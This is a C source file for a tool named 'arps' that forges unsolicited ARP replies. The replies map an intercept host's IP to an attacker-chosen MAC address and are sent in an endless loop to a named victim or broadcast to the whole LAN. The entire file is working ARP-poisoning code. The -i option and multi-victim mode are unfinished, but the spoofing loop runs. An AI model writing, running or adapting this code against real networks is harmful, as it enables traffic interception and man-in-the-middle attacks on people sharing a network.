#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <getopt.h>
#include <netdb.h>

#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>

#include "maclib.h"
#include "string_util.h"


#define ipcpy(dst, doff, src, srcoff)		\
  dst[doff] = src[srcoff];			\
  dst[doff+1] = src[srcoff+1];			\
  dst[doff+2] = src[srcoff+2];			\
  dst[doff+3] = src[srcoff+3];

#define maccpy(dst, doff, src, srcoff)		\
  dst[doff] = src[srcoff];			\
  dst[doff+1] = src[srcoff+1];			\
  dst[doff+2] = src[srcoff+2];			\
  dst[doff+3] = src[srcoff+3];			\
  dst[doff+4] = src[srcoff+4];			\
  dst[doff+5] = src[srcoff+5];

/*

                                                       
    ----------------
   | intercept-host |
    ----------------
                                 --------------
                                | this-machine |---> BROADCAST
  -  -  -  -  -  -  -  -         --------------
 |                      |
     ----------------
 |  | redirect-host  |  |
     ----------------
 |                      |
  -  -  -  -  -  - -   -



*/

void printArp(unsigned char *packet) {
  printf("SHA %02X:%02X:%02X:%02X:%02X:%02X ",
	 packet[8], packet[9], packet[10], packet[11], packet[12], packet[13]);
  printf("SPA %u.%u.%u.%u ", packet[14], packet[15], packet[16], packet[17]);
  printf("THA %02X:%02X:%02X:%02X:%02X:%02X ",
	 packet[18], packet[19], packet[20], packet[21], packet[22], packet[23]);
  printf("TPA %u.%u.%u.%u\n", packet[24], packet[25], packet[26], packet[27]);
}

void usage()
{
  fprintf(stderr, "Usage: arps [-f] [-i interface] [-r redirect-host] [-s sleep-time-sec] intercept-host [victims...]\n");
  fprintf(stderr, "\n");
  fprintf(stderr, "Read as \"Send an unsolicted ARP reply to <victims> that map <intercept-host> to <redirect-host>\n");
  fprintf(stderr, "every <sleep-time-sec> seconds\"\n");
  fprintf(stderr, "\n");
  fprintf(stderr, "   intercept-host      the host to intercept arp packets from\n");
  fprintf(stderr, "\n");
  fprintf(stderr, "Options:\n");
  fprintf(stderr, "   -f                  forces a broadcast (will not prompt the user to make sure)\n");
  fprintf(stderr, "   -i interface        the network interface to send the ARP replys (i.e. eth0)\n");
  fprintf(stderr, "   -r redirect-host    the mac address to redirect victims to.  If none is specified then the\n");
  fprintf(stderr, "                       current machine's mac will be used.\n");
  fprintf(stderr, "   -s sleep-time-sec   time (in seconds) between arp replys\n");
  fprintf(stderr, "   victims             list of victims to send the arp spoof packets.  Must be IP/MAC pairs.\n");
  fprintf(stderr, "                       i.e. 1.2.3.4 AA-BB-CC-DD-EE-FF 4.3.2.1 11-22-33-44-55-66\n");
}

char * tryDnsResolve(const char *host, unsigned char *outIPNetworkOrder) {
  // Try DNS Resolution
  struct hostent *hostEntry = gethostbyname(host);
  if(hostEntry == NULL) {
    fprintf(stderr, "intercept-host '%s' could not be parsed as an ip address and it could not be resolved by DNS\n", host);
    return NULL;
  }
  
  if(hostEntry->h_addr_list == NULL || hostEntry->h_addr_list[0] == NULL) {
    fprintf(stderr, "intercept-host '%s' could not be parsed as an ip address and it could not be resolved by DNS\n", host);
    return NULL;
  }
  
  // if there are multiple ip entries
  if(hostEntry->h_addr_list[1] != NULL) {
    // count entries
    unsigned int dnsIndex = 0;
    for(dnsIndex = 0; hostEntry->h_addr_list[dnsIndex]; dnsIndex++);
    fprintf(stderr, "Info: There are %u dns entries for host %s:\n", dnsIndex, hostEntry->h_name);
    
    for(dnsIndex = 0; hostEntry->h_addr_list[dnsIndex]; dnsIndex++) {
      unsigned char *ip = hostEntry->h_addr_list[dnsIndex];
      fprintf(stderr, "      %u.%u.%u.%u\n", ip[0], ip[1], ip[2], ip[3]);
    }
    fprintf(stderr, "Pick one of these addresses and use that as the address instead of '%s'\n", host);
    return NULL;
  }

  ipcpy(outIPNetworkOrder, 0, hostEntry->h_addr_list[0], 0);
  return hostEntry->h_name;
}


int main(int argc, char *argv[])
{
  int c;

  unsigned char packet[32];

  int victimCount;
  int redirectMacIsLocal = 1; // if the redirect mac is local then the ethernet header of the spoofed arp
                              // packets does not need to be changed

  int forceBroadcast = 0;
  const char *interfaceString = NULL;
  const char *redirectHostString = NULL;
  const char *sleepString = NULL;

  while((c = getopt(argc, argv, "fi:r:s:")) >= 0) {
    switch(c) {
    case 'f':
      forceBroadcast = 1;
      break;
    case 'i':
      interfaceString = optarg;
      break;
    case 'r':
      redirectHostString = optarg;
      break;
    case 's':
      sleepString = optarg;
      break;
    default:
      usage();
      return -1;
    }
  }

  argc -= optind;
  argv += optind;

  if(argc < 1) {
    fprintf(stderr, "Error: missing intercept-host\n\n");
    usage();
    return -1;
  }

  //
  // Get Interface
  //
  if(interfaceString != NULL) {
    fprintf(stderr, "The -i option has note been implemented yet\n");
    return -1;
  }


  //
  // Get Intercept IP
  //
  unsigned int interceptIPNetworkOrder;
  unsigned char interceptIPBytes[4];

  if(str2ip(argv[0], &interceptIPNetworkOrder) != NULL) {

    interceptIPBytes[0] = (unsigned char)(interceptIPNetworkOrder >> 24);
    interceptIPBytes[1] = (unsigned char)(interceptIPNetworkOrder >> 16);
    interceptIPBytes[2] = (unsigned char)(interceptIPNetworkOrder >>  8);
    interceptIPBytes[3] = (unsigned char)(interceptIPNetworkOrder      );

    printf("Intercept IP        : %u.%u.%u.%u\n", interceptIPBytes[0], interceptIPBytes[1],
	   interceptIPBytes[2], interceptIPBytes[3]);

  } else {

    char *interceptDnsName = tryDnsResolve(argv[0], interceptIPBytes);
    if(interceptDnsName == NULL) return -1;

    interceptIPNetworkOrder =
      (0xFF000000 & (interceptIPBytes[0] << 24)) |
      (  0xFF0000 & (interceptIPBytes[1] << 16)) |
      (    0xFF00 & (interceptIPBytes[2] <<  8)) |
      (      0xFF & (interceptIPBytes[3]      ));

    printf("DNS Resolution      : %s > %u.%u.%u.%u\n", interceptDnsName,
	   interceptIPBytes[0], interceptIPBytes[1], interceptIPBytes[2], interceptIPBytes[3]);
  }


  //
  // Get Redirect Mac
  //
  unsigned char redirectMac[6];
  if(redirectHostString == NULL) {
    // Get Current System's Mac Address
    struct ifreq interfaceRequest;
    unsigned int netmaskNetworkOrder;
    const char *errorMessage = getMacForIP(interceptIPNetworkOrder, &interfaceRequest, &netmaskNetworkOrder);

    if(errorMessage) {
      printf("Could not get this system's MAC address on the subnet for IP %u.%u.%u.%u: %s\n",
	     interceptIPBytes[0], interceptIPBytes[1], interceptIPBytes[2], interceptIPBytes[3],
	     errorMessage);
      return -1;
    }
    
    maccpy(redirectMac, 0, interfaceRequest.ifr_hwaddr.sa_data, 0);

    printf("Interface           : %s\n", interfaceRequest.ifr_name);

  } else {

    if(str2mac(redirectHostString, redirectMac) == NULL) {

      unsigned int redirectIPNetworkOrder;
      unsigned char redirectIPBytes[4];
      if(str2ip(redirectHostString, &redirectIPNetworkOrder) != NULL) {

	redirectIPBytes[0] = (unsigned char)(redirectIPNetworkOrder >> 24);
	redirectIPBytes[1] = (unsigned char)(redirectIPNetworkOrder >> 16);
	redirectIPBytes[2] = (unsigned char)(redirectIPNetworkOrder >>  8);
	redirectIPBytes[3] = (unsigned char)(redirectIPNetworkOrder      );
	
	printf("Redirect IP         : %u.%u.%u.%u\n", redirectIPBytes[0], redirectIPBytes[1],
	       redirectIPBytes[2], redirectIPBytes[3]);
	
      } else {
	
	char *redirectDnsName = tryDnsResolve(redirectHostString, redirectIPBytes);
	if(redirectDnsName == NULL) return -1;
	
	redirectIPNetworkOrder =
	  (0xFF000000 & (redirectIPBytes[0] << 24)) |
	  (  0xFF0000 & (redirectIPBytes[1] << 16)) |
	  (    0xFF00 & (redirectIPBytes[2] <<  8)) |
	  (      0xFF & (redirectIPBytes[3]      ));
	
	printf("DNS Resolution      : %s > %u.%u.%u.%u\n", redirectDnsName,
	       redirectIPBytes[0], redirectIPBytes[1], redirectIPBytes[2], redirectIPBytes[3]);
      }

      fprintf(stderr, "Error: ip to arp resolution not yet implemented\n");
      fprintf(stderr, "Note: The redirect-host you gave '%s' is an ip address, but arp resolution is not implemented yet.\n", redirectHostString);
      fprintf(stderr, "      You can manually get the mac address of this ip by executing:\n");
      fprintf(stderr, "      arping -c 1 %s\n", redirectHostString);
      return -1;
    }
    redirectMacIsLocal = 0; // TODO: check to make sure that this is not the current system's mac address

  }

  printf("Redirect Mac%s : %02X:%02X:%02X:%02X:%02X:%02X\n", (redirectMacIsLocal) ? "(local)" : "",
	 redirectMac[0], redirectMac[1], redirectMac[2], redirectMac[3], redirectMac[4], redirectMac[5]);    






  //
  // Single Victim Mode
  //
  if(argc <= 3)
  {
    unsigned char victimIPBytes[4];
    unsigned char victimMac[6];

    struct sockaddr_ll victimSockAddr;
    victimSockAddr.sll_family   = PF_PACKET;
    victimSockAddr.sll_protocol = htons(ETH_P_ARP); // no protocol
    victimSockAddr.sll_ifindex  = 2; // is this right?
    victimSockAddr.sll_hatype   = ARPHRD_ETHER; // is this right?

    if(argc == 1) {
      // ask user if they are sure
      if(!forceBroadcast) {
	printf("You have not given any specific 'victims', are you sure you want to broadcast these packets to everyone on your LAN (y/n)? ");
	c = getchar();
	if(c != 'y' && c != 'Y') return -1;
      }

      victimSockAddr.sll_pkttype = PACKET_BROADCAST;

      // broadcast ip
      victimIPBytes[0] = 0x00;
      victimIPBytes[1] = 0x00;
      victimIPBytes[2] = 0x00;
      victimIPBytes[3] = 0x00;

      // broadcast mac
      victimMac[0] = 0xFF;
      victimMac[1] = 0xFF;
      victimMac[2] = 0xFF;
      victimMac[3] = 0xFF;
      victimMac[4] = 0xFF;
      victimMac[5] = 0xFF;
    } else {
      if(argc == 2) {
	fprintf(stderr, "You specified a victim IP but you must also supply their MAC address\n");
	return -1;
      }

      victimSockAddr.sll_pkttype = PACKET_OTHERHOST;

      unsigned int victimIP;
      char *victimString = str2ip(argv[1], &victimIP);
      if(victimString == NULL) {
	fprintf(stderr, "victim '%s' could not be parsed as an ip address\n", argv[1]);
	return -1;
      }
      if(str2mac(argv[2], victimMac) == NULL) {
	fprintf(stderr, "the second part of the victim '%s' could not be parsed as a mac address\n", argv[2]);
	return -1;
      }

      victimIPBytes[0] = (unsigned char)(victimIP >> 24);
      victimIPBytes[1] = (unsigned char)(victimIP >> 16);
      victimIPBytes[2] = (unsigned char)(victimIP >>  8);
      victimIPBytes[3] = (unsigned char)(victimIP      );


      victimSockAddr.sll_halen = 6;
      maccpy(victimSockAddr.sll_addr, 0, victimMac, 0);
    }      

    //
    // Generate Packet Structure
    //
    packet[0] = 0x00; // HTYPE (0x0001 = Ethernet)
    packet[1] = 0x01;
    packet[2] = 0x08; // PTYPE (0x0800 = IPV4)
    packet[3] = 0x00;
    packet[4] =    6; // HLEN (Ethernet Address Length = 6)
    packet[5] =    4; // PLEN (IPV4 Address Length = 4)
    packet[6] =    0; // OPER (1 = request, 2 = reply)
    packet[7] =    2;
    
    // SHA (Sender Hardware Address)
    maccpy(packet, 8, redirectMac, 0);

    // SPA (Sender Protocol Address) (Filled in when received request)
    ipcpy(packet, 14, interceptIPBytes, 0);

    // THA (Victim Hardware Address)
    maccpy(packet, 18, victimMac, 0);

    // TPA (Victim Protocol Address)
    ipcpy(packet, 24, victimIPBytes, 0);

    //
    // Create Socket
    //
    int sock = socket(PF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
    if(sock < 0) {
      fprintf(stderr, "socket returned %d\n", sock);
      return -1;
    }

    while(1) {
      printArp(packet);
      ssize_t bytesSent = sendto(sock, packet, 28, 0,
				 (struct sockaddr*)&victimSockAddr, sizeof(victimSockAddr));
      if(bytesSent == -1) {
	fprintf(stderr, "send failed\n");
	return -1;
      }

      sleep(2);
    }
  } 
  //
  // Multiple Victim Mode
  //
  else
  {
    fprintf(stderr, "more than 1 victim is not implemented\n");
    return -1;

  }

  return 0;
}
